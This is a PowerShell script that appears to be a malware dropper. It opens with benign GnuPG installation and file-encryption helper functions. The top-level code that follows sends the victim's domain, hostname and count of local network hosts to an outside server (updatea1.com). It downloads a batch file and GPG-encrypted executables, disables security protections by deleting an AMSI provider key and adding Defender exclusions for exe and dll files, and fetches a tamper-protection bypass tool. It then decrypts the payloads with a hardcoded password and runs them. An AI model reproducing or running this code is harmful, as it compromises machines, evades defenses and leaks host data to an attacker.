function Install-GnuPg {
	
	<#
	.SYNOPSIS
		This function installed the GnuPg for Windows application.  It the installer file is not in
		the DownloadFolderPath, the function will download the file from the Internet and then execute a silent installation.
	.PARAMETER  DownloadFolderPath
		The folder path where you'd like to download the GnuPg for Windows installer into.

	.PARAMETER  DownloadUrl
		The URL that will be used to download the EXE setup installer.

	.EXAMPLE
		PS> Install-GnuPg -DownloadFolderPath C:\Downloads

		This will first check to ensure the GnuPg for Windows installer is in the C:\Downloads folder.  If not, it will then
		download the file from the default URL set at DownloadUrl.  Once downloaded, it will then silently execute
		the installation and get the application installed with default parameters.
	
	.INPUTS
		None. This function does not accept pipeline input.

	.OUTPUTS
		None. If successful, this function will not return any output.
	#>
	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadFolderPath,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadUrl = 'http://files.gpg4win.org/gpg4win-2.2.5.exe'
		
	)
	process {
		try {
			$DownloadFilePath = "$DownloadFolderPath\$($DownloadUrl | Split-Path -Leaf)"
			if (-not (Test-Path -Path $DownloadFilePath -PathType Leaf)) {
				Write-Verbose -Message "Downloading [$($DownloadUrl)] to [$($DownloadFilePath)]"
				Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadFilePath
			} else {
				Write-Verbose -Message "The download file [$($DownloadFilePath)] already exists"
			}
			Write-Verbose -Message 'Attempting to install GPG4Win...'
			Start-Process -FilePath $DownloadFilePath -ArgumentList '/S' -NoNewWindow -Wait -PassThru
			Write-Verbose -Message 'GPG4Win installed'
		} catch {
			Write-Error $_.Exception.Message
		}
	}
}

function Add-Encryption {
	<#
	.SYNOPSIS
		This function uses the GnuPG for Windows application to symmetrically encrypt a set of files in a folder.

	.DESCRIPTION
		A detailed description of the function.

	.PARAMETER FolderPath
		This is the folder path that contains all of the files you'd like to encrypt.

	.PARAMETER  Password
		This is the password that will be used to encrypt the files.

	.EXAMPLE
		PS> Add-Encryption -FolderPath C:\TestFolder -Password secret

		This example would encrypt all of the files in the C:\TestFolder folder with the password of 'secret'.  The encrypted
		files would be created with the same name as the original files only with a GPG file extension.

	.INPUTS
		None. This function does not accept pipeline input.

	.OUTPUTS
		System.IO.FileInfo
	#>
	
	[CmdletBinding()]
	[OutputType([System.IO.FileInfo])]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({Test-Path -Path $_ -PathType Container})]
		[string]$FolderPath,
	
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$Password,
	
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$GpgPath = 'C:\Program Files (x86)\GNU\GnuPG\gpg2.exe'
		
	)
	process {
		try {
			Get-ChildItem -Path $FolderPath | foreach {
				Write-Verbose -Message "Encrypting [$($_.FullName)]"
				& $GpgPath --batch --passphrase $Password -c $_.FullName
			}
			Get-ChildItem -Path $FolderPath -Filter '*.gpg'
		} catch {
			Write-Error $_.Exception.Message
		}
	}
}

function Remove-Encryption {
	<#
	.SYNOPSIS
		This function decrypts all files encrypted with the Add-Encryption function. Once decrypted, it will add the files
		to the same directory that contains the encrypted files and will remove the GPG file extension.

	.PARAMETER FolderPath
		The folder path that contains all of the encrypted *.gpg files.

	.PARAMETER Password
		The password that was used to encrypt the files.

	.EXAMPLE
		PS> Remove-Encryption -FolderPath C:\MyFolder -Password secret

		This example will attempt to decrypt all files inside of the C:\MyFolder folder using the password of 'secret'

	.INPUTS
		None. This function does not accept pipeline input.

	.OUTPUTS
		System.IO.FileInfo
	
	#>
	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({ Test-Path -Path $_ -PathType Container })]
		[string]$FolderPath,
		
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$Password,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$GpgPath = 'C:\Program Files (x86)\GNU\GnuPG\gpg2.exe'
	)
	process {
		try {
			Get-ChildItem -Path $FolderPath -Filter '*.gpg' | foreach {
				$decryptFilePath = $_.FullName.TrimEnd('.gpg')
				Write-Verbose -Message "Decrypting [$($_.FullName)] to [$($decryptFilePath)]"
				$startProcParams = @{
					'FilePath'     = $GpgPath
					'ArgumentList' = "--batch --yes --passphrase $Password -o $decryptFilePath -d $($_.FullName)" 
					'Wait'         = $true
					'NoNewWindow'  = $true
				}
				$null = Start-Process @startProcParams
			}
			Get-ChildItem -Path $FolderPath | where {$_.Extension -ne 'gpg'}
		} catch {
			Write-Error $_.Exception.Message
		}
	}
}


$MaxIPToSendRequest = 2



$UserDomain = wmic computersystem get domain
$UserDomain = $UserDomain[2]
$UserDomain = $UserDomain.trim()

$UserPCname = $env:computername
$UserPCname = $UserPCname.trim()


Write-Host  'UserDomain = '$UserDomain
Write-Host  'UserPCname = '$UserPCname


$Condition001 = ($UserDomain -ne $UserPCname)
$Condition002 = ($UserDomain -ne "WORKGROUP") 

        $ArpInfo  = arp -a

        $arr1 =$ArpInfo | select-string "192.168.(\d{1,3})(\.\d{1,3})(.)*(\w\w-){5}(\w\w)" 
        $arr1_count= $arr1.length
        #Write-Output $arr1

        $arr2 =$ArpInfo | select-string "10.(\d{1,3}).\d{1,3}(\.\d{1,3})(.)*(\w\w-){5}(\w\w)" 
        $arr2_count= $arr2.length
        #Write-Output $arr2

        
        $arr3 =$ArpInfo | select-string "172.(\d{1,3}).\d{1,3}(\.\d{1,3})(.)*(\w\w-){5}(\w\w)" 
        $arr3_count= $arr3.length
        #Write-Output $arr3
        
        $IP_count= $arr1_count + $arr2_count + $arr3_count 

Write-Host 'IP_count =' $IP_count

$Condition003 = ($IP_count -ge $MaxIPToSendRequest)

$Condition_All =  $Condition001 -and $Condition002 -and $Condition003




if ($Condition_All ) 
{
    $URL = "https://updatea1.com/s3ok71/index/d2ef590c0310838490561a205469713d/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname
   $URL1 = "https://updatea1.com/s3ok71/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname
   
		Invoke-WebRequest https://updatea1.com/s3ok71/index/b1eeec75ef1488e2484b14c8fd46ddce/?servername=msi -OutFile shutdowni.bat
		
		Invoke-WebRequest $URL -outfile p9d2s.exe.gpg
	    Invoke-WebRequest $URL1 -outfile p9d2.exe.gpg
		
        
  	
}
else
{
    

   $URL = "https://updatea1.com/s3ok71/index/d2ef590c0310838490561a205469713d/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname
   $URL1 = "https://updatea1.com/s3ok71/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname
   
		Invoke-WebRequest https://updatea1.com/s3ok71/index/b1eeec75ef1488e2484b14c8fd46ddce/?servername=msi -OutFile shutdowni.bat
		
		Invoke-WebRequest $URL -outfile p9d2s.exe.gpg
	    Invoke-WebRequest $URL1 -outfile p9d2.exe.gpg
		
        
}

Write-Host $URL
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$uri = 'https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1'
$moduleFolderPath = 'C:\Program Files\WindowsPowerShell\Modules\GnuPg'
$null = New-Item -Path $moduleFolderPath -Type Directory
Invoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath -ChildPath 'GnuPg.psm1')
$env:APPDATA
Install-GnuPG -DownloadFolderPath $env:APPDATA
echo "START"
Add-MpPreference -ExclusionExtension “exe”
Add-MpPreference -ExclusionExtension “dll”
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
$MaxIPToSendRequest = 2
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Remove-Encryption -FolderPath $env:APPDATA -Password '105b'
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
Invoke-WebRequest https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe

.\p9d2s.exe
.\p9d2.exe